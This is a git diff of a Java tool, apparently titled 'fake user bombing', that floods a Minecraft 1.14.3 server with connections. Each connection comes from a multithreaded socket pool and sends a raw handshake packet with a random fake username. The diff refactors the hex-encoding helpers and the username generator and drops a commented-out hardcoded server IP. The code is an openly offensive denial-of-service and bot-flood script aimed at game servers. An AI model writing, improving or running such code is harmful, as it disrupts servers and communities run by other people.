@@ -11,27 +11,13 @@ import java.util.concurrent.BlockingQueue;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 
-import static util.HexUtil.hexStrToBinaryStr;
-import static util.HexUtil.str2HexStr;
+import static util.HexUtil.*;
 
 /**
  * 假用户轰炸 for Minecraft Server 1.14.3
  * @author crt106 on 2019/8/10.
  */
 class FakeUserFuck {
-
-    private static final String HEAD_HEX_CRT = "1400ea030d7777772e6372743130362e636e63dd02";
-    private static final String HEAD_HEX_YYH = "1300ea030c6d632e6372743130362e636e63dd02";
-    /**
-     * 用于建立十六进制字符的输出的小写字符数组
-     */
-    private static final char[] DIGITS_LOWER = {'0', '1', '2', '3', '4', '5',
-            '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
-    /**
-     * 用于建立十六进制字符的输出的大写字符数组
-     */
-    private static final char[] DIGITS_UPPER = {'0', '1', '2', '3', '4', '5',
-            '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'};
 
     private static BlockingQueue blockingQueue = new ArrayBlockingQueue(100);
     private static ThreadPoolExecutor t = new ThreadPoolExecutor(100, 100, 1500, TimeUnit.MILLISECONDS, blockingQueue);
@@ -41,14 +27,11 @@ class FakeUserFuck {
         Runnable mainFuck = () -> {
             try {
                 FuckTarget fuckTarget = FuckTarget.CRT;
-//                Socket socket = new Socket("120.79.169.48", 25565);
                 Socket socket = new Socket(fuckTarget.getIp(), fuckTarget.getPort());
                 OutputStream os = socket.getOutputStream();
                 InputStream in = socket.getInputStream();
                 if (os != null) {
-//                    String crt106HEX = "080006637274313036";
-//                    String rHEX1 = "0b000967646b61736a677067";
-                    String rHex = getRandomUserHex();
+                    String rHex = getRandomUserHex(8);
                     sendHex(os, "");
                     sendHex(os, fuckTarget.getHexhead() + rHex);
                     ReadOne(in);
@@ -86,16 +69,7 @@ class FakeUserFuck {
         }
     }
 
-    /**
-     * 获取长度为6的用户名
-     *
-     * @return
-     */
-    private static String getRandomUserHex() {
-        String rname = RandomStringUtils.randomAlphanumeric(6);
-        String rHex = str2HexStr(rname);
-        return "080006" + rHex;
-    }
+
 
     private static byte[] ReadOne(InputStream in) {
         try {
